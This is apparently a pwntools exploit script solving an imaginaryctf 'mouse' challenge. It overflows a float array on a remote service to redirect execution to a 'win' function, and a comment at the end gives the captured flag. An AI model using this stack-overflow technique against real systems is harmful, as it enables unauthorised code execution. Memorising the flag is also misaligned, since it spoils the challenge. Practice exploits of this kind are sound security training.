from pwn import *
import struct


def u2f(u):
    s = struct.pack("<I", u)
    return struct.unpack("<f", s)[0]


context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "debug"
context.arch = "amd64"

elf = ELF("./mouse")
# io = gdb.debug("./mouse", 'b *(vuln+448)\nc')
# io = process("./mouse")
io = remote("puzzler7.imaginaryctf.org", 4004)
n = 24
io.sendlineafter(b"have? ", str(n).encode())
for i in range(16):
    io.sendlineafter(b"number? ", str(i).encode())
io.sendlineafter(b"number? ", str(u2f(21)).encode())
io.sendlineafter(b"number? ", str(u2f(elf.sym["win"])).encode())
io.sendlineafter(b"number? ", str(u2f(0)).encode())
io.interactive()
# ictf{it_wouldve_been_couldve_been_worse_than_you_would_ever_know}
